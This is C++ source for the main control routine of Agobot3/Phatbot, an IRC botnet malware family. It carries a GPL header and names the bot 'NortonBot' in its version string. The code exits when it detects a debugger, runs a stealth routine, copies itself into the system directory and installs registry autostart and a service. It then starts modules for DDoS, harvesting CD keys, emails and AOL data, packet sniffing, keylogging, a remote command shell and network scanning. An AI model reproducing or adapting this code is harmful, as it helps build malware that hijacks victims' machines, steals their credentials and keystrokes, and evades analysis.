/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "mainctrl.h"

char *cby="\xDA\x0A\x60";
#ifdef _WIN32
extern "C" void __cdecl do_stealth();
#endif // _WIN32

CMainCtrl *g_pMainCtrl=NULL;
CCleanupThread *g_pCleanupThread=NULL;

CMainCtrl::CMainCtrl() { }
CMainCtrl::~CMainCtrl() { }

int CMainCtrl::MainCtrl()
{
#ifdef DBGCONSOLE
	m_cConsDbg.Log(1, "Started main control...\n");
#endif

	bool bFailed=false; while(m_bRunning && !bFailed)
	{	// Control Loop starts here, set m_bRunning to false to
		// stop, set bFailed in case of component failure

		if(!m_cIRC.m_bRunning) bFailed=true;

		if(!bFailed) bFailed=!m_cBot.Think();

		if(bFailed) m_bRunning=false;

		Sleep(250); }
	if(bFailed) return 1; else return 0; }

int CMainCtrl::Main(const char *szCmdLine, const char *szArgv0)
{	m_bRunning=true; m_bHashCheckFailed=false;

	if(szArgv0) m_sArgv0.Assign(szArgv0); else m_sArgv0.Assign("");
	if(szCmdLine) m_sCmdLine.Assign(szCmdLine); else m_sCmdLine.Assign("");

#ifdef LINUX
	// make the segmentation violation signal ignored
	signal(SIGSEGV, SIG_IGN);
	// make the broken pipe signal ignored
	signal(SIGPIPE, SIG_IGN);
#endif // LINUX

	// Parse command line
	m_cCmdLine.Parse(szCmdLine);

	// Activate debugging console
	if(m_cCmdLine.m_cConfig.bDebug) m_cConsDbg.Init(m_cCmdLine.m_cConfig.iDebugLevel);

	// Activate sockets
	g_bSocketsRunning=true;

#ifdef _WIN32
	// Detect if being debugged
	if(m_cDebugDetect.IsDebug()) {
#ifdef DBGCONSOLE
		m_cConsDbg.Log(5, "Being debugged, exiting...\n");
#endif // DBGCONSOLE
		m_bRunning=false;
		ExitProcess(1);
	}
#endif // _WIN32

#ifdef DBGCONSOLE
	m_cConsDbg.Log(5, "Command line: \"%s\"...\n", szCmdLine);
#endif // DBGCONSOLE

	m_sNameVerStr.Format("NortonBot (%s) \"%s\" on \"%s\"", VERSION_PHATBOT, SYS_BUILD, SYS_PLATFORM);
#ifdef DBGCONSOLE
	m_cConsDbg.Log(1, "%s starting up...\n", m_sNameVerStr.CStr());
	m_cConsDbg.Log(2, "Debugging with debuglevel of %d...\n", m_cCmdLine.m_cConfig.iDebugLevel);
#endif // DBGCONSOLE



#ifdef _DEBUG
	test(); // while(true) Sleep(5000);
#endif // _DEBUG

	// Initialize base subsystems, don't swap
	m_cCommands.Init();
#ifdef DBGCONSOLE
	m_cConsDbg.Log(5, "Commands module initialized...\n");
#endif // DBGCONSOLE
	m_cCVar.Init();
#ifdef DBGCONSOLE
	m_cConsDbg.Log(5, "CVar module initialized...\n");
#endif // DBGCONSOLE	
	m_cMac.Init();
#ifdef DBGCONSOLE
	m_cConsDbg.Log(5, "CMac module initialized...\n");
#endif // DBGCONSOLE
	m_cBot.Init();
#ifdef DBGCONSOLE
	m_cConsDbg.Log(5, "CBot module initialized...\n");
#endif // DBGCONSOLE
	
#ifdef WIN32
	if(g_pMainCtrl->m_cBot.do_stealth.bValue) { do_stealth(); }
	if(m_cCmdLine.m_cConfig.bService || m_cBot.as_service.bValue) {
#ifdef DBGCONSOLE
		m_cConsDbg.Log(5, "Starting service thread...\n");
#endif // DBGCONSOLE
		m_cService.Start(false);
	}
#endif // WIN32

#ifdef DBGCONSOLE
	m_cConsDbg.Log(5, "Installing bot...\n");
#endif // DBGCONSOLE
	if(m_cBot.as_enabled.bValue || m_cBot.as_service.bValue)
		m_cInstaller.CopyToSysDir(m_cBot.bot_filename.sValue);
	m_cInstaller.Install();
#ifdef WIN32
	if(m_cBot.as_enabled.bValue) {
#ifdef DBGCONSOLE
		m_cConsDbg.Log(5, "Adding registry autostart...\n");
#endif // DBGCONSOLE
		m_cInstaller.RegStartAdd(m_cBot.as_valname.sValue, m_cBot.bot_filename.sValue); }

//	ServiceDel(m_cBot.as_service_name.sValue);

	if(m_cBot.as_service.bValue && !m_cInstaller.IsInstalled(m_cBot.as_service_name.sValue)) {
#ifdef DBGCONSOLE
		m_cConsDbg.Log(5, "Adding service...\n");
#endif // DBGCONSOLE
		m_cInstaller.ServiceAdd(m_cBot.as_service_name.sValue, m_cBot.bot_filename.sValue);
	}
	
	if(m_cBot.as_service.bValue && !m_cCmdLine.m_cConfig.bService) {
#ifdef DBGCONSOLE
		m_cConsDbg.Log(5, "Starting service...\n");
#endif // DBGCONSOLE
		if(m_cInstaller.ServiceStart(m_cBot.as_service_name.sValue)) {
			exit(0); } }

#endif // WIN32

#ifdef DBGCONSOLE
	m_cConsDbg.Log(7, "Initializing RNG...\n");
#endif // DBGCONSOLE
	// Initialize random number generator from system time
	init_random();

	// Receive a random nickname
	m_sUserName=RndNick(m_cBot.si_nickprefix.sValue.CStr());

	// Receive a random service name for NBSCanner
	m_sTmpSvcName=CompleteRandom().CStr();

	// Start the startup thread
	m_cStartupThread.Start(false);

#ifdef DBGCONSOLE
	m_cConsDbg.Log(5, "Initializing subsystems...\n");
#endif // DBGCONSOLE
	// Initialize subsystems
	m_cIRC.Init(); m_cDownloader.Init(); m_cSpeedTest.Init(); m_cDDOS.Init();
	m_cRedirect.Init(); m_cRSLControl.Init();
	m_cProcessControl.Init(); m_cInstaller.Init(); m_cHarvest_CDKeys.Init();
	m_cLogic.Init();
#ifdef _WIN32
	m_cHarvest_EMails.Init(); m_cHarvest_AOL.Init(); m_cHarvest_Registry.Init();
	m_cPluginLoader.Init();
#endif // _WIN32
	
#ifdef _WIN32
	if(g_pMainCtrl->m_cBot.bot_cmdshell.bValue) m_cCmdShell.Init();
#endif // _WIN32

	// Execute the autostart in config.cpp
	m_cBot.Autostart();

	// Set server CVars
	g_pMainCtrl->m_cCVar.SetCVar(&g_pMainCtrl->m_cBot.si_chanpass, g_pMainCtrl->m_cIRC.m_vServers.at(0)->si_chanpass->sValue.CStr());
	g_pMainCtrl->m_cCVar.SetCVar(&g_pMainCtrl->m_cBot.si_mainchan, g_pMainCtrl->m_cIRC.m_vServers.at(0)->si_mainchan->sValue.CStr());
	g_pMainCtrl->m_cCVar.SetCVar(&g_pMainCtrl->m_cBot.si_nickprefix, g_pMainCtrl->m_cIRC.m_vServers.at(0)->si_nickprefix->sValue.CStr());
	g_pMainCtrl->m_cCVar.SetCVar(&g_pMainCtrl->m_cBot.si_port, g_pMainCtrl->m_cIRC.m_vServers.at(0)->si_port->sValue.CStr());
	g_pMainCtrl->m_cCVar.SetCVar(&g_pMainCtrl->m_cBot.si_server, g_pMainCtrl->m_cIRC.m_vServers.at(0)->si_server->sValue.CStr());
	g_pMainCtrl->m_cCVar.SetCVar(&g_pMainCtrl->m_cBot.si_servpass, g_pMainCtrl->m_cIRC.m_vServers.at(0)->si_servpass->sValue.CStr());
	g_pMainCtrl->m_cCVar.SetCVar(&g_pMainCtrl->m_cBot.si_usessl, g_pMainCtrl->m_cIRC.m_vServers.at(0)->si_usessl->sValue.CStr());

	CString sRndNick=RndNick(m_cBot.si_nickprefix.sValue.CStr());
	m_sUserName.Format("%s", sRndNick.Mid(0, 32).CStr());

#ifdef DBGCONSOLE
	m_cConsDbg.Log(5, "Starting threads...\n");
#endif // DBGCONSOLE

	// Start CIRC as a non-dynamic, auto-restarting and realtime thread
	m_cIRC.Start(false, true, true);
	
	m_cSendFile.m_iListenPort=g_pMainCtrl->m_cBot.bot_ftrans_port.iValue;
	m_cSendFile.m_pfnAcceptHandler=&CSendFileAccept;
#ifdef DBGCONSOLE
	m_cSendFile.m_sFriendlyName.Assign("SendFile");
#endif // DBGCONSOLE
	m_cSendFile.Start(false, true);

	m_cSendFileFTP.m_iListenPort=g_pMainCtrl->m_cBot.bot_ftrans_port_ftp.iValue;
	m_cSendFileFTP.m_pfnAcceptHandler=&CSendFileFTPAccept;
#ifdef DBGCONSOLE
	m_cSendFileFTP.m_sFriendlyName.Assign("FTP");
#endif // DBGCONSOLE
	m_cSendFileFTP.Start(false, true);

	m_cSniffer.Start(false, true);
#ifdef WIN32
	m_cKeyLog.Start(false, true);
#endif
	// Initialize scanner after autostart/thread initialization to be able to use CIRC
	m_cScanner.Init();

	// Start the main loop
#ifdef DBGCONSOLE
	m_cConsDbg.Log(7, "Starting the main loop...\n");
#endif // DBGCONSOLE

	m_cBot.RunScript(SCRIPT_ONSTART);
	int iRetVal=MainCtrl();
	m_bRunning=false;

	// Deactivate sockets
	g_bSocketsRunning=false;
#ifdef WIN32
	m_cKeyLog.Join();
#endif
	m_cSniffer.Join(); m_cSendFileFTP.Join(); m_cSendFile.Join();
	m_cIRC.Join(); m_cStartupThread.Join();
#ifdef _WIN32
	m_cService.Join();
#endif // _WIN32

#ifdef DBGCONSOLE
	m_cConsDbg.Log(7, "Terminated the main loop...\n");
#endif // DBGCONSOLE

	// Deactivate debugging console
	if(m_cCmdLine.m_cConfig.bDebug) {
#ifdef WIN32
//		system("pause");
#endif // WIN32
		m_cConsDbg.DeInit(); }

	return iRetVal; }

// Platform compatibility hacks

#ifdef WIN32
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hprev, PSTR cmdline, int ishow)
{	int iRetVal=0; bool bRestart=true;
	if(g_pCleanupThread) delete g_pCleanupThread;
	g_pCleanupThread=new CCleanupThread;
	while(bRestart) {
		bRestart=false; try {
			g_pMainCtrl=new CMainCtrl;
			g_pCleanupThread->Start(false, true);
			iRetVal=g_pMainCtrl->Main(cmdline, NULL);
			g_pCleanupThread->Cleanup();
			g_pCleanupThread->Kill();
			delete g_pMainCtrl; g_pMainCtrl=NULL;
#ifdef PtW32CatchAll
		} PtW32CatchAll {
#else
		} catch(...) {
#endif
			bRestart=true; }
	}
	delete g_pCleanupThread; g_pCleanupThread=NULL;
	return iRetVal; }
#else
int main(int argc, char **argv)
{	int argvlen=0, i; char *szArgv;
	if(argc < 2) {
		szArgv="";
	} else {
		for(i=1; i<argc; i++) argvlen+=(strlen(argv[i])+2);
		szArgv=(char*)malloc(argvlen); strcpy(szArgv, "");
		if(argv[1]) strncpy(szArgv, argv[1], argvlen);
		for(i=2; i<argc; i++) { if(argv[i]) strncat(szArgv, " ", argvlen); strncat(szArgv, argv[i], argvlen); }
	}
	int iRetVal=0; bool bRestart=true;
	if(g_pCleanupThread) delete g_pCleanupThread;
	g_pCleanupThread=new CCleanupThread;
	while(bRestart) {
		bRestart=false; try {
			g_pMainCtrl=new CMainCtrl;
			g_pCleanupThread->Start(false, true);
			iRetVal=g_pMainCtrl->Main(szArgv, argv[0]);
			g_pCleanupThread->Cleanup();
			g_pCleanupThread->Kill();
			delete g_pMainCtrl; g_pMainCtrl=NULL;
#ifdef PtW32CatchAll
		} PtW32CatchAll {
#else
		} catch(...) {
#endif
			bRestart=true;
		}
	}
	delete g_pCleanupThread; g_pCleanupThread=NULL;
	if(argc >= 2) free(szArgv); return iRetVal; }
#endif // WIN32
